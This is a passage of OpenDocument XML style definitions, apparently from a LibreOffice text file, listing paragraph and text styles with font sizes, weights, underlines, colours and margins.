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4a6d" officeooo:paragraph-rsid="004644f7"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000590bc" officeooo:paragraph-rsid="004644f7" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00069445" officeooo:paragraph-rsid="004644f7" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000efd25" officeooo:paragraph-rsid="000efd25" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000efd25" officeooo:paragraph-rsid="000efd25" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Heading_20_4">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000efd25" officeooo:paragraph-rsid="000efd25" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000efd25" officeooo:paragraph-rsid="0034c5ce" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000f9631" officeooo:paragraph-rsid="000f9631" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000f9631" officeooo:paragraph-rsid="002ca858" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000d0cb9" officeooo:paragraph-rsid="00261a16" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000d0cb9" officeooo:paragraph-rsid="000d0cb9" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00044a6d" officeooo:paragraph-rsid="004644f7" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0009e65f" officeooo:paragraph-rsid="0009e65f" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000baa9e" officeooo:paragraph-rsid="000baa9e" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000efd25" officeooo:paragraph-rsid="000efd25" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000efd25" officeooo:paragraph-rsid="00127c04" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="000f9631" officeooo:paragraph-rsid="000f9631" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="00127c04" officeooo:paragraph-rsid="00127c04" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P19" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0013a235" officeooo:paragraph-rsid="0013a235" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="001d6be6" officeooo:paragraph-rsid="001d6be6" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0020809f" officeooo:paragraph-rsid="0020809f" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0009e65f" officeooo:paragraph-rsid="0009e65f" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="000efd25" officeooo:paragraph-rsid="000efd25" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0013a235" officeooo:paragraph-rsid="0013a235" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0013a235" officeooo:paragraph-rsid="00157255" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="00127c04" officeooo:paragraph-rsid="00127c04" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="00127c04" officeooo:paragraph-rsid="000efd25" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0012bb16" officeooo:paragraph-rsid="0012bb16" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P29" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="00235596" officeooo:paragraph-rsid="00235596" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P30" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="000efd25" officeooo:paragraph-rsid="000efd25" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="000f9631" officeooo:paragraph-rsid="000f9631" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0028e3a9" officeooo:paragraph-rsid="0028e3a9" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0034c5ce" officeooo:paragraph-rsid="0034c5ce" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:paragraph-rsid="0034c5ce"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00190ffa" officeooo:paragraph-rsid="00190ffa" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="0043e30b" officeooo:paragraph-rsid="0043e30b" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="004588fa" officeooo:paragraph-rsid="004588fa" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00359e57" officeooo:paragraph-rsid="00359e57" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P39" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="003a112e" officeooo:paragraph-rsid="003f9c0c" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P40" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00190ffa" officeooo:paragraph-rsid="00190ffa" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P41" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0043e30b" officeooo:paragraph-rsid="0043e30b" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="004588fa" officeooo:paragraph-rsid="004588fa" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00359e57" officeooo:paragraph-rsid="00359e57" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00359e57" officeooo:paragraph-rsid="003824b9" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P45" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00359e57" officeooo:paragraph-rsid="003a112e" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P46" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003a112e" officeooo:paragraph-rsid="003a112e" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P47" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003a112e" officeooo:paragraph-rsid="003f9c0c" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P48" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003db42f" officeooo:paragraph-rsid="003db42f" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P49" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="0049d446" officeooo:paragraph-rsid="0049d446" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P50" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="000590bc" officeooo:paragraph-rsid="004644f7" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P51" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00069445" officeooo:paragraph-rsid="00069445" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P52" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00069445" officeooo:paragraph-rsid="00044a6d" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P53" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="00069445" officeooo:paragraph-rsid="004644f7" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P54" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="000baa9e" officeooo:paragraph-rsid="000baa9e" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P55" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="000d0cb9" officeooo:paragraph-rsid="000d0cb9" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P56" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" officeooo:rsid="00069445" officeooo:paragraph-rsid="004644f7" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P57" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00190ffa" officeooo:paragraph-rsid="00190ffa" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P58" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000efd25" officeooo:paragraph-rsid="000efd25" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P59" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="0043e30b" officeooo:paragraph-rsid="0043e30b" style:font-size-asian="16pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P60" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="00424eb4" officeooo:paragraph-rsid="00424eb4" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P61" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="00424eb4" officeooo:paragraph-rsid="00424eb4" style:font-size-asian="14pt" style:font-weight-asian="bold" style:font-size-complex="16pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P62" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="16pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00424eb4" officeooo:paragraph-rsid="00424eb4" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="16pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P63" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="00190ffa" officeooo:paragraph-rsid="00190ffa" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P64" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001a3ac0" officeooo:paragraph-rsid="001a3ac0" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P65" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001c294e" officeooo:paragraph-rsid="001c294e" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P66" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-weight="bold" officeooo:rsid="001d6be6" officeooo:paragraph-rsid="001d6be6" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P67" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="18pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="0009e65f" officeooo:paragraph-rsid="0009e65f" style:font-size-asian="18pt" style:font-weight-asian="bold" style:font-size-complex="18pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P68" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="18pt" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000baa9e" officeooo:paragraph-rsid="000baa9e" style:font-size-asian="18pt" style:font-weight-asian="bold" style:font-size-complex="18pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P69" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="004588fa" officeooo:paragraph-rsid="004588fa" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P70" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="00424eb4" officeooo:paragraph-rsid="00424eb4" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P71" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="003824b9" officeooo:paragraph-rsid="003824b9" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P72" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="004644f7" officeooo:paragraph-rsid="00424eb4" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P73" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="001d6be6" officeooo:paragraph-rsid="001d6be6" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P74" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0021a9f3" officeooo:paragraph-rsid="0021a9f3" style:font-size-asian="12.25pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P75" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="000f9631" officeooo:paragraph-rsid="000f9631" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P76" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="002c410c" officeooo:paragraph-rsid="002c410c" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P77" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="14pt" fo:font-weight="normal" officeooo:rsid="0034c5ce" officeooo:paragraph-rsid="0034c5ce" style:font-size-asian="14pt" style:font-weight-asian="normal" style:font-size-complex="14pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P78" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="0028e3a9" officeooo:paragraph-rsid="0028e3a9" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P79" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" fo:font-weight="normal" officeooo:rsid="000efd25" officeooo:paragraph-rsid="000efd25" style:font-size-asian="12pt" style:font-weight-asian="normal" style:font-size-complex="12pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P80" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.503cm"/>
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P81" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" style:contextual-spacing="false" style:line-height-at-least="0.503cm"/>
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P82" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.503cm"/>
      <style:text-properties fo:color="#800000" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" fo:font-weight="normal" fo:background-color="#ffffff"/>
    </style:style>
    <style:style style:name="P83" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#800000" loext:opacity="100%" style:font-name="Droid Sans Mono" fo:font-size="10.5pt" style:text-underline-style="none" fo:font-weight="normal" officeooo:rsid="004644f7" officeooo:paragraph-rsid="00424eb4" fo:background-color="#ffffff" style:font-size-asian="12.25pt" style:font-weight-asian="bold" style:font-size-complex="14pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P84" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties style:line-height-at-least="0.503cm"/>
    </style:style>
    <style:style style:name="P85" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1"/>
    <style:style style:name="P86" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P87" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2"/>
    <style:style style:name="P88" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P89" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3"/>
    <style:style style:name="P90" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L3">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P91" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4"/>
    <style:style style:name="P92" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L4">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P93" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5"/>
    <style:style style:name="P94" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L5">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="0005f112"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00081445"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00115215" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="00127c04" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="0012bb16" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
